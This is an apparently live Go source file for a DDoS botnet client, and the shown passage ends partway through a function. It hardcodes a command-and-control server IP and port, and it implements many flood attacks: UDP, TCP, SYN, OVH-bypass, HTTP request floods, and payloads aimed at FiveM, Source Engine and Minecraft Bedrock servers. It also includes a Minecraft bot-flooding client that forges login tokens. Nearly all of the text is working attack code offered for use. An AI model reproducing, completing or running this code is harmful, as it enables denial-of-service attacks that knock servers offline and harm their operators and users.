package main

import (
	"bytes"
	"compress/flate"
	"compress/zlib"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha512"
	"crypto/x509"
	"encoding/asn1"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"math/big"
	mathrand "math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
var (
	C2_ADDRESS      = "45.13.236.245"
	C2_PORT         = 25848
	RECONNECT_DELAY = 5 * time.Second
)

// ─── PAYLOADS ──────────────────────────────────────────────────────────────────
var (
	payloadFivem = []byte{0xff, 0xff, 0xff, 0xff, 0x67, 0x65, 0x74, 0x69, 0x6e, 0x66, 0x6f, 0x20, 0x78, 0x78, 0x78, 0x00, 0x00, 0x00}
	payloadVse   = []byte{0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00}
	payloadMcpe  = []byte{0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20, 0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61, 0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74, 0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69, 0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x73}
	payloadHex   = []byte{0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01}
)

// ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
type Attack struct {
	Method   string
	IP       string
	Port     int
	Duration int
	Username string
	StopChan chan bool
	Active   bool
	mu       sync.Mutex
}

var (
	attacks   = make(map[string][]*Attack)
	attacksMu sync.Mutex
)

// ─── MCBOT GLOBALES ──────────────────────────────────────────────────────────
var (
	mcbotBots    = []*MCBot{}
	mcbotMu      sync.Mutex
	mcbotStop    chan bool
	mcbotRunning = false
	mcbotStopMu  sync.Mutex
	mcbotCtx     context.Context
	mcbotCancel  context.CancelFunc
)

// ─── UTILIDADES ──────────────────────────────────────────────────────────────
func getArchitecture() string {
	arch := runtime.GOARCH
	switch arch {
	case "amd64":
		return "x86_64"
	case "arm64", "arm64be":
		return "aarch64"
	case "arm", "armbe":
		if runtime.GOOS == "linux" {
			if strconv.IntSize == 64 {
				return "aarch64"
			}
		}
		return "arm"
	case "386":
		return "i386"
	default:
		return arch
	}
}

func countCPU() int {
	return runtime.NumCPU()
}

func randomUrandom(size int) []byte {
	b := make([]byte, size)
	rand.Read(b)
	return b
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── ATAQUES UDP ─────────────────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func attackUDP(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		sizes := []int{1024, 2048}
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			size := sizes[mathrand.Intn(len(sizes))]
			packet := randomUrandom(size)
			conn.Write(packet)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackUDPFrag(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			packet := randomUrandom(65000)
			size := 1000 + mathrand.Intn(64000)
			conn.Write(packet[:size])
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackUDPGame(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		sizes := []int{512, 780, 1024, 1032}
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			size := sizes[mathrand.Intn(len(sizes))]
			packet := randomUrandom(size)
			conn.Write(packet)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackUDPKill(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		sockets := []*net.UDPConn{}
		for i := 0; i < 10; i++ {
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
			if err == nil {
				sockets = append(sockets, conn)
			}
		}
		defer func() {
			for _, s := range sockets {
				s.Close()
			}
		}()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			for _, sock := range sockets {
				for i := 0; i < 50; i++ {
					data := randomUrandom(1400)
					sock.Write(data)
				}
			}
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackUDPPPS(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			for i := 0; i < 50; i++ {
				conn.Write([]byte{})
			}
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackUDPQuery(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	query := []byte{0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(query)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── ATAQUES TCP ─────────────────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func attackTCP(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 100*time.Millisecond)
			if err != nil {
				continue
			}
			payload := randomUrandom(1400)
			for i := 0; i < 50; i++ {
				if !time.Now().Before(endTime) {
					break
				}
				_, err := conn.Write(payload)
				if err != nil {
					break
				}
			}
			conn.Close()
		}
	}
	numWorkers := countCPU() * 2
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackTCPOVH(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 3*time.Second)
			if err != nil {
				continue
			}
			packet := randomUrandom(65000)
			for i := 0; i < 10; i++ {
				conn.Write(packet[:1400])
			}
			conn.Close()
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackSYN(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), time.Second)
			if err != nil {
				continue
			}
			conn.Write(randomUrandom(1024))
			conn.Close()
		}
	}
	numWorkers := countCPU() * 2
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackMIX(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			if mathrand.Intn(2) == 0 {
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
				if err == nil {
					conn.Write(randomUrandom(1024))
					conn.Close()
				}
			} else {
				conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
				if err == nil {
					conn.Write(randomUrandom(1024))
					conn.Close()
				}
			}
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── ATAQUES OVH ─────────────────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func attackOVHUDP(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		packet := randomUrandom(65000)
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(packet)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackOVHPPS(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	smallPayloads := [][]byte{
		{0x00}, {0x01}, {0xff}, {0x16}, {0x13}, {0x03},
		{0x47}, {0x50}, {0x48}, {0x4f},
		{0x00, 0x00}, {0x01, 0x00}, {0xff, 0xff}, {0x80, 0x00},
		randomUrandom(1), randomUrandom(2),
	}
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			for i := 0; i < 100; i++ {
				payload := smallPayloads[mathrand.Intn(len(smallPayloads))]
				conn.Write(payload)
			}
			time.Sleep(time.Millisecond)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── ATAQUES ESPECIALES ──────────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func attackHEX(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(payloadHex)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackMCPE(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(payloadMcpe)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackFIVEM(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(payloadFivem)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackVSE(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(payloadVse)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

func attackRakNet(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	rakPacket := []byte{0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	worker := func(workerID int) {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			return
		}
		defer conn.Close()
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				return
			default:
			}
			conn.Write(rakPacket)
		}
	}
	numWorkers := countCPU()
	for i := 0; i < numWorkers; i++ {
		go worker(i)
	}
	time.Sleep(time.Duration(secs) * time.Second)
	select {
	case <-stopChan:
	default:
	}
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── ATAQUE HTTP ─────────────────────────────────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

func attackHTTP(ip string, port int, secs int, stopChan <-chan bool) {
	endTime := time.Now().Add(time.Duration(secs) * time.Second)
	var totalRequests int64
	var mu sync.Mutex

	methods := [][]byte{[]byte("GET"), []byte("POST"), []byte("HEAD")}
	paths := [][]byte{
		[]byte("/"), []byte("/index.html"), []byte("/api/v1/data"), []byte("/login"), []byte("/dashboard"),
		[]byte("/profile"), []byte("/settings"), []byte("/products"), []byte("/services"), []byte("/about"),
	}
	userAgents := [][]byte{
		[]byte("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
		[]byte("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"),
		[]byte("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
		[]byte("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"),
	}

	requestCache := make([][]byte, 300)
	for i := range requestCache {
		method := methods[mathrand.Intn(len(methods))]
		path := paths[mathrand.Intn(len(paths))]
		ua := userAgents[mathrand.Intn(len(userAgents))]
		req := bytes.Buffer{}
		req.Write(method)
		req.WriteByte(' ')
		req.Write(path)
		req.WriteString(" HTTP/1.1\r\n")
		req.WriteString("Host: ")
		req.WriteString(ip)
		req.WriteString("\r\nUser-Agent: ")
		req.Write(ua)
		req.WriteString("\r\nAccept: */*\r\n")
		req.WriteString("Accept-Language: en-US,en;q=0.5\r\n")
		req.WriteString("Connection: keep-alive\r\n")
		if mathrand.Float32() < 0.3 {
			req.WriteString("Referer: https://google.com/\r\n")
		}
		req.WriteString("\r\n")
		requestCache[i] = req.Bytes()
	}

	createConnection := func() net.Conn {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
		if err != nil {
			return nil
		}
		return conn
	}

	worker := func(workerID int) {
		localCount := 0
		connections := []net.Conn{}
		for i := 0; i < 8; i++ {
			conn := createConnection()
			if conn != nil {
				connections = append(connections, conn)
			}
		}
		if len(connections) == 0 {
			return
		}
		for time.Now().Before(endTime) {
			select {
			case <-stopChan:
				for _, conn := range connections {
					conn.Close()
				}
				return
			default:
			}
			for _, conn := range connections {
				req := requestCache[mathrand.Intn(len(requestCache))]
				_, err := conn.Write(req)
				if err != nil {
					conn.Close()
					newConn := createConnection()
					if newConn != nil {
						conn = newConn
					}
				}
				localCount++
			}
			time.Sleep(time.Microsecond)
		}
		mu.Lock()
		totalRequests += int64(localCount)
		mu.Unlock()
		for _, conn := range connections {
			conn.Close()
		}
	}

	numWorkers := countCPU() * 4
	fmt.Printf("[HTTP] Target: %s:%d | Workers: %d\n", ip, port, numWorkers)

	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			worker(id)
		}(i)
	}
	wg.Wait()
	fmt.Printf("[HTTP] Finalizado - Requests: %d\n", totalRequests)
}

// ═════════════════════════════════════════════════════════════════════════════
// ─── MCBOT COMPLETO (COPIADO DE MCBOT.GO) ──────────────────────────────────
// ═════════════════════════════════════════════════════════════════════════════

var (
	magic = []byte{0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78}
	mtus  = []int{1447, 1492, 1464, 1400, 1200, 576}
)

type writer struct{ b bytes.Buffer }

func (w *writer) u8(v byte) *writer       { _ = w.b.WriteByte(v); return w }
func (w *writer) u16be(v int) *writer     { _ = binary.Write(&w.b, binary.BigEndian, uint16(v)); return w }
func (w *writer) i32be(v int32) *writer   { _ = binary.Write(&w.b, binary.BigEndian, v); return w }
func (w *writer) u32be(v uint32) *writer  { _ = binary.Write(&w.b, binary.BigEndian, v); return w }
func (w *writer) i32le(v int32) *writer   { _ = binary.Write(&w.b, binary.LittleEndian, v); return w }
func (w *writer) i64be(v int64) *writer   { _ = binary.Write(&w.b, binary.BigEndian, v); return w }
func (w *writer) u64be(v uint64) *writer  { _ = binary.Write(&w.b, binary.BigEndian, v); return w }
func (w *writer) f32be(v float32) *writer { _ = binary.Write(&w.b, binary.BigEndian, v); return w }
func (w *writer) u24le(v uint32) *writer {
	_ = w.b.WriteByte(byte(v))
	_ = w.b.WriteByte(byte(v >> 8))
	_ = w.b.WriteByte(byte(v >> 16))
	return w
}
func (w *writer) varint(v uint32) *writer {
	for {
		part := byte(v & 0x7f)
		v >>= 7
		if v != 0 {
			part |= 0x80
		}
		_ = w.b.WriteByte(part)
		if v == 0 {
			return w
		}
	}
}
func (w *writer) raw(v []byte) *writer { _, _ = w.b.Write(v); return w }
func (w *writer) str(v string) *writer {
	b := []byte(v)
	return w.u16be(len(b)).raw(b)
}
func (w *writer) strRaw(v []byte) *writer { return w.u16be(len(v)).raw(v) }
func (w *writer) buf() []byte             { return w.b.Bytes() }

func (w *writer) rakIP(host string, port int) error {
	ip := net.ParseIP(host).To4()
	if ip == nil {
		return fmt.Errorf("solo se admite IPv4 para RakNet: %q", host)
	}
	w.u8(4)
	for _, octet := range ip {
		w.u8(^octet)
	}
	w.u16be(port)
	return nil
}

func (w *writer) stdIP(host string, port int) error {
	ip := net.ParseIP(host).To4()
	if ip == nil {
		return fmt.Errorf("solo se admite IPv4 para RakNet: %q", host)
	}
	w.u8(4)
	for _, octet := range ip {
		w.u8(octet)
	}
	w.u16be(port)
	return nil
}

type reader struct {
	b []byte
	p int
}

func (r *reader) take(n int) ([]byte, error) {
	if n < 0 || r.p+n > len(r.b) {
		return nil, io.ErrUnexpectedEOF
	}
	v := r.b[r.p : r.p+n]
	r.p += n
	return v, nil
}
func (r *reader) skip(n int) error { _, err := r.take(n); return err }
func (r *reader) left() int        { return len(r.b) - r.p }
func (r *reader) u8() (byte, error) {
	v, err := r.take(1)
	if err != nil {
		return 0, err
	}
	return v[0], nil
}
func (r *reader) u16be() (uint16, error) {
	v, err := r.take(2)
	if err != nil {
		return 0, err
	}
	return binary.BigEndian.Uint16(v), nil
}
func (r *reader) i32be() (int32, error) {
	v, err := r.take(4)
	if err != nil {
		return 0, err
	}
	return int32(binary.BigEndian.Uint32(v)), nil
}
func (r *reader) u32be() (uint32, error) {
	v, err := r.take(4)
	if err != nil {
		return 0, err
	}
	return binary.BigEndian.Uint32(v), nil
}
func (r *reader) i64be() (int64, error) {
	v, err := r.take(8)
	if err != nil {
		return 0, err
	}
	return int64(binary.BigEndian.Uint64(v)), nil
}
func (r *reader) tLE() (uint32, error) {
	v, err := r.take(3)
	if err != nil {
		return 0, err
	}
	return uint32(v[0]) | uint32(v[1])<<8 | uint32(v[2])<<16, nil
}
func (r *reader) f32be() (float32, error) {
	v, err := r.take(4)
	if err != nil {
		return 0, err
	}
	return math.Float32frombits(binary.BigEndian.Uint32(v)), nil
}
func (r *reader) str() (string, error) {
	n, err := r.u16be()
	if err != nil {
		return "", err
	}
	v, err := r.take(int(n))
	return string(v), err
}

func rawES384(der []byte) ([]byte, error) {
	var sig struct{ R, S *big.Int }
	if _, err := asn1.Unmarshal(der, &sig); err != nil || sig.R == nil || sig.S == nil {
		return nil, errors.New("firma ECDSA DER inválida")
	}
	out := make([]byte, 96)
	rb, sb := sig.R.Bytes(), sig.S.Bytes()
	if len(rb) > 48 || len(sb) > 48 {
		return nil, errors.New("firma ECDSA demasiado grande")
	}
	copy(out[48-len(rb):48], rb)
	copy(out[96-len(sb):], sb)
	return out, nil
}

func b64url(v []byte) string {
	return strings.TrimRight(base64.RawURLEncoding.EncodeToString(v), "=")
}

func compactJSON(v any) ([]byte, error) { return json.Marshal(v) }

func makeJWT(key *ecdsa.PrivateKey, payload any) (string, error) {
	pubDER, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	if err != nil {
		return "", err
	}
	header, _ := compactJSON(map[string]string{"alg": "ES384", "x5u": base64.StdEncoding.EncodeToString(pubDER)})
	body, err := compactJSON(payload)
	if err != nil {
		return "", err
	}
	unsigned := b64url(header) + "." + b64url(body)
	digest := sha512.Sum384([]byte(unsigned))
	der, err := ecdsa.SignASN1(rand.Reader, key, digest[:])
	if err != nil {
		return "", err
	}
	raw, err := rawES384(der)
	if err != nil {
		return "", err
	}
	return unsigned + "." + b64url(raw), nil
}

func generateSteveSkin() string {
	buf := make([]byte, 64*64*4)
	fill := func(x0, y0, x1, y1 int, c [3]byte) {
		for y := y0; y < y1; y++ {
			for x := x0; x < x1; x++ {
				i := (y*64 + x) * 4
				buf[i], buf[i+1], buf[i+2], buf[i+3] = c[0], c[1], c[2], 255
			}
		}
	}
	skinColor := [3]byte{141, 85, 49}
	eyesWhite := [3]byte{236, 236, 236}
	pupil := [3]byte{30, 30, 130}
	hair := [3]byte{53, 26, 14}
	shirt := [3]byte{53, 97, 145}
	pants := [3]byte{44, 44, 88}
	shoes := [3]byte{68, 68, 68}
	fill(8, 8, 16, 16, skinColor)
	fill(8, 0, 16, 8, hair)
	fill(9, 11, 11, 13, eyesWhite)
	fill(13, 11, 15, 13, eyesWhite)
	fill(9, 12, 11, 13, pupil)
	fill(13, 12, 15, 13, pupil)
	fill(11, 14, 13, 15, [3]byte{120, 55, 40})
	fill(0, 0, 8, 8, hair)
	fill(16, 0, 24, 8, hair)
	fill(0, 8, 8, 16, hair)
	fill(16, 8, 24, 16, hair)
	fill(0, 16, 8, 24, hair)
	fill(8, 16, 16, 24, hair)
	fill(16, 16, 24, 24, hair)
	fill(20, 20, 28, 32, shirt)
	fill(22, 22, 26, 26, [3]byte{63, 137, 190})
	fill(44, 20, 48, 32, shirt)
	fill(36, 52, 40, 64, shirt)
	fill(4, 20, 8, 32, pants)
	fill(20, 52, 24, 64, pants)
	fill(4, 28, 8, 32, shoes)
	fill(20, 60, 24, 64, shoes)
	return base64.StdEncoding.EncodeToString(buf)
}

type position struct {
	x, y, z, yaw, headYaw, pitch float32
	velocityY                    float32
	onGround                     bool
}

type splitPacket struct {
	count uint32
	parts map[uint32][]byte
}

// MCBot - Igual que en mcbot.go
type MCBot struct {
	mu               sync.Mutex
	conn             *net.UDPConn
	remote           *net.UDPAddr
	ctx              context.Context
	cancel           context.CancelFunc
	name             string
	host             string
	port             int
	register         string
	registerProvided bool
	messages         []string
	interval         time.Duration
	key              *ecdsa.PrivateKey
	stopChan         <-chan bool

	phase                     string
	proto                     int
	mtuIndex                  int
	mtuSize                   int
	clientID                  uint64
	serverGUID                uint64
	sendSeq                   uint32
	msgIndex                  uint32
	orderIndex                uint32
	splitID                   uint32
	entityID                  int64
	pos                       position
	spawned                   bool
	closing                   bool
	registerSent              bool
	resourcePackDone          bool
	useVariantA               bool
	frames                    map[uint32][]byte
	splits                    map[uint16]*splitPacket
	ackQueue                  []uint32
	lastAction                time.Time
	lastPing                  time.Time
	pingCount                 int
	lastMTURetry              time.Time
	lastRequest2              time.Time
	request2Attempt           int
	loginScheduled            bool
	lastConnectionRequest     time.Time
	connectionRequestAttempts int
	loopsStarted              bool
	spawnFallback             bool
}

func randomName(base string) string {
	if base == "" {
		base = "Steve"
	}
	if base == "Bot" || base == "Steve" {
		base = "GoBot"
	}
	v, _ := rand.Int(rand.Reader, big.NewInt(999))
	return base + strconv.Itoa(int(v.Int64()))
}

func newMCBot(ctx context.Context, host string, port int, name, register string, registerProvided bool, messages []string, interval time.Duration, stopChan <-chan bool) (*MCBot, error) {
	child, cancel := context.WithCancel(ctx)
	key, err := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
	if err != nil {
		cancel()
		return nil, err
	}
	var idBytes [8]byte
	if _, err := rand.Read(idBytes[:]); err != nil {
		cancel()
		return nil, err
	}
	conn, err := net.ListenUDP("udp4", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
	if err != nil {
		cancel()
		return nil, err
	}
	remote, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		cancel()
		_ = conn.Close()
		return nil, err
	}
	b := &MCBot{
		conn: conn, remote: remote, ctx: child, cancel: cancel,
		name: randomName(name), host: host, port: port,
		register: register, registerProvided: registerProvided,
		messages: messages, interval: interval, key: key,
		phase: "UNCONNECTED", proto: 84, mtuIndex: 0, mtuSize: mtus[0],
		clientID: binary.BigEndian.Uint64(idBytes[:]), pos: position{y: 64, onGround: true},
		frames: make(map[uint32][]byte), splits: make(map[uint16]*splitPacket),
		stopChan: stopChan,
	}
	return b, nil
}

func randomString(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	out := make([]byte, n)
	for i := range out {
		out[i] = chars[mathrand.Intn(len(chars))]
	}
	return string(out)
}

func randomPass() string { return randomString(8) }

func randomXUID() string {
	digits := make([]byte, 14)
	for i := range digits {
		digits[i] = byte('0' + mathrand.Intn(10))
	}
	return "25" + string(digits)
}

func (b *MCBot) rawSend(packet []byte) error {
	b.mu.Lock()
	closed := b.closing
	b.mu.Unlock()
	if closed {
		return context.Canceled
	}
	_, err := b.conn.WriteToUDP(packet, b.remote)
	return err
}

func (b *MCBot) initialPing() error {
	b.mu.Lock()
	clientID, count := b.clientID, b.pingCount
	b.lastPing = time.Now()
	b.mu.Unlock()
	var id [8]byte
	binary.BigEndian.PutUint64(id[:], clientID)
	timestamp := time.Now().UnixMilli()
	if count%2 == 1 {
		timestamp = 0
	}
	packet := (&writer{}).u8(0x01).i64be(timestamp).raw(magic).raw(id[:]).buf()
	return b.rawSend(packet)
}

func (b *MCBot) request1() error {
	b.mu.Lock()
	mtu := mtus[b.mtuIndex%len(mtus)]
	b.mtuSize = mtu
	b.lastMTURetry = time.Now()
	b.mu.Unlock()
	padding := mtu - 28 - 1 - 16 - 1
	if padding < 0 {
		padding = 0
	}
	return b.rawSend((&writer{}).u8(0x05).raw(magic).u8(7).raw(make([]byte, padding)).buf())
}

func (b *MCBot) request2(attempt int) error {
	b.mu.Lock()
	mtu, id, guid := b.mtuSize, b.clientID, b.serverGUID
	b.lastRequest2 = time.Now()
	b.request2Attempt = attempt + 1
	b.mu.Unlock()
